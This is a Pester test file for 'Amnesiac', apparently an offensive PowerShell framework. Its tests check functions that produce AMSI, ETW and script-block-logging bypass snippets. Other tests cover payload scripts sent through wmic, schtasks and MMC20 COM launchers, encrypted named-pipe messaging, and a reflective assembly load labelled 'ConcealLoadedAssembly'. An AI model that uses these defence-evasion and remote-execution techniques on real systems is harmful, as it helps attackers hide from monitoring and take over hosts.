#Requires -Version 5.1
# Amnesiac helper function tests — dot-sources Amnesiac.ps1 to get module-level functions
# Run: Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed

# Global setup for New-PayloadScript tests
$global:EndMarker  = 'TESTMARK'
$global:BufferSize = 1024
$global:PayloadConfig = @{
    Amsi        = 'fail'
    Etw         = 'provider'
    Sbl         = $true
    Launcher    = 'ps'
    Encoding    = 'gzip'
    Jitter      = 'medium'
    Obfuscation = 'medium'
    Keys        = @{}
}

Describe "Module-level helpers are importable" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "Amnesiac.ps1 dot-sources without error" {
        $true | Should -Be $true
    }
}

Describe "Get-AmsiBypassSnippet" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "returns non-empty string for 'fail'" {
        $s = Get-AmsiBypassSnippet -Technique 'fail'
        $s | Should -Not -BeNullOrEmpty
    }
    It "fail snippet contains amsiInitFailed" {
        $s = Get-AmsiBypassSnippet -Technique 'fail'
        $s | Should -Match 'amsiIn'
    }
    It "direct snippet contains Add-Type or VP" {
        $s = Get-AmsiBypassSnippet -Technique 'direct'
        $s | Should -Match '(Add-Type|VP)'
    }
    It "pageguard falls back to fail snippet" {
        $s = Get-AmsiBypassSnippet -Technique 'pageguard'
        $s | Should -Match 'amsiIn'
    }
    It "hwbp falls back to fail snippet" {
        $s = Get-AmsiBypassSnippet -Technique 'hwbp'
        $s | Should -Match 'amsiIn'
    }
    It "each technique returns valid parseable PS" {
        foreach ($t in 'fail','direct','pageguard','hwbp') {
            $s = Get-AmsiBypassSnippet -Technique $t
            $errors = $null
            [System.Management.Automation.Language.Parser]::ParseInput($s, [ref]$null, [ref]$errors) | Out-Null
            $errors | Should -BeNullOrEmpty -Because "technique '$t' must produce parseable PS"
        }
    }
}

Describe "Get-EtwBypassSnippet" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "returns non-empty string for all techniques" {
        foreach ($t in 'provider','patch','thread') {
            $s = Get-EtwBypassSnippet -Technique $t
            $s | Should -Not -BeNullOrEmpty -Because "technique '$t' must return code"
        }
    }
    It "provider snippet disables PSEtwLogProvider" {
        $s = Get-EtwBypassSnippet -Technique 'provider'
        $s | Should -Match 'PSEtwLog'
    }
    It "patch snippet targets EtwEventWrite" {
        $s = Get-EtwBypassSnippet -Technique 'patch'
        $s | Should -Match 'EtwEventWrite'
    }
}

Describe "Get-SblBypassSnippet" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "returns non-empty string" {
        $s = Get-SblBypassSnippet
        $s | Should -Not -BeNullOrEmpty
    }
    It "snippet targets checkScriptBlockLoggingCache" {
        $s = Get-SblBypassSnippet
        $s | Should -Match 'checkScri'
    }
}

Describe "New-PayloadScript" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "returns object with InlinePS and FullCommand properties" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.InlinePS    | Should -Not -BeNullOrEmpty
        $r.FullCommand | Should -Not -BeNullOrEmpty
    }
    It "payload does not contain hardcoded #END#" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Not -Match '#END#'
    }
    It "payload contains session EndMarker" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Match 'TESTMARK'
    }
    It "payload contains amsi bypass" {
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Match 'amsiIn'
    }
    It "server variant includes PipeSecurity" {
        $r = New-PayloadScript -IsServer -PipeName 'testpipe' -SID 'S-1-1-0'
        $r.RawScript | Should -Match 'PipeSecurity'
    }
    It "environment key is prepended when set" {
        $global:PayloadConfig.Keys = @{ Hostname = 'WIN-TARGET01' }
        $r = New-PayloadScript -ComputerName 'target' -PipeName 'testpipe'
        $r.RawScript | Should -Match 'WIN-TARGET01'
        $global:PayloadConfig.Keys = @{}
    }
}

Describe "Get-PayloadLauncher" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "ps launcher returns powershell.exe command" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'ps'
        $r | Should -Match 'powershell.exe'
        $r | Should -Match 'PAYLOAD'
    }
    It "wmi launcher uses wmic" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'wmi'
        $r | Should -Match 'wmic'
    }
    It "schtask launcher uses schtasks" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'schtask'
        $r | Should -Match 'schtasks'
    }
    It "com launcher uses MMC20" {
        $r = Get-PayloadLauncher -Script 'PAYLOAD' -Launcher 'com'
        $r | Should -Match 'MMC20'
    }
}

Describe "Initialize-DiskStructure" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "creates no folders when DiskMode is false" {
        $global:DiskMode = $false
        $testPath = "C:\Users\Public\Documents\Amnesiac"
        $existed = Test-Path $testPath
        Initialize-DiskStructure
        if (-not $existed) {
            Test-Path $testPath | Should -Be $false
        }
    }
}

Describe "AES pipe encryption helpers" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "Protect-PipeMessage and Unprotect-PipeMessage round-trip" {
        $key = [byte[]](1..16)
        $plain = "test command output with special chars: !@#$%"
        $cipher = Protect-PipeMessage -PlainText $plain -Key $key
        $result = Unprotect-PipeMessage -CipherB64 $cipher -Key $key
        $result | Should -Be $plain
    }
    It "cipher is base64 encoded" {
        $key = [byte[]](1..16)
        $cipher = Protect-PipeMessage -PlainText "hello" -Key $key
        { [Convert]::FromBase64String($cipher) } | Should -Not -Throw
    }
    It "two encryptions of same plaintext produce different ciphertext (IV randomness)" {
        $key = [byte[]](1..16)
        $c1 = Protect-PipeMessage -PlainText "hello" -Key $key
        $c2 = Protect-PipeMessage -PlainText "hello" -Key $key
        $c1 | Should -Not -Be $c2
    }
}

Describe "Test-NetworkLogonToken" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "returns a boolean" {
        $r = Test-NetworkLogonToken
        $r | Should -BeOfType [bool]
    }
}

Describe "Initialize-ToolCache" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "populates ToolCache with at least the core embedded tools" {
        $global:ToolCache = @{}
        Initialize-ToolCache
        $global:ToolCache.Keys | Should -Contain 'SimpleAMSI'
        $global:ToolCache.Keys | Should -Contain 'NETAMSI'
    }
}

Describe "load loader command handler" {
    BeforeAll {
        $scriptPath = Join-Path (Split-Path $PSScriptRoot) "Amnesiac.ps1"
        . $scriptPath
    }

    It "AmnesiacLoaderB64 is non-empty after dot-source" {
        $AmnesiacLoaderB64 | Should -Not -Be $null
    }

    It "load loader sends a single [Reflection.Assembly]::Load command containing the full base64" {
        $global:AmnesiacLoaderB64 = "FAKEB64BLOB=="
        $written = [System.Collections.Generic.List[string]]::new()

        $mockWriter = [PSCustomObject]@{}
        $mockWriter | Add-Member -MemberType ScriptMethod -Name WriteLine -Value {
            param($line) $written.Add($line)
        }
        $mockWriter | Add-Member -MemberType ScriptMethod -Name Flush -Value { }

        $readQueue = [System.Collections.Generic.Queue[string]]::new()
        $readQueue.Enqueue($global:EndMarker)
        $mockReader = [PSCustomObject]@{}
        $mockReader | Add-Member -MemberType ScriptMethod -Name ReadLine -Value {
            if ($readQueue.Count -gt 0) { return $readQueue.Dequeue() }
            return $global:EndMarker
        }

        $command = "load loader"
        if ($command -eq "load loader") {
            if (-not [string]::IsNullOrEmpty($global:AmnesiacLoaderB64)) {
                $loadCmd = "`$_la=[Reflection.Assembly]::Load([Convert]::FromBase64String('$($global:AmnesiacLoaderB64)'));[AmnesiacLoader.Stomper]::ConcealLoadedAssembly(`$_la)"
                $mockWriter.WriteLine($loadCmd)
                $mockWriter.Flush()
                while ($true) {
                    $ln = $mockReader.ReadLine()
                    if ($ln -eq $global:EndMarker) { break }
                }
            }
        }

        $written.Count | Should -Be 1
        $written[0]    | Should -Match '\[Reflection\.Assembly\]::Load'
        $written[0]    | Should -Match 'FAKEB64BLOB=='
        $written[0]    | Should -Match 'ConcealLoadedAssembly'
        $written[0]    | Should -Not -Match '__MODULE_BEGIN__'
    }
}
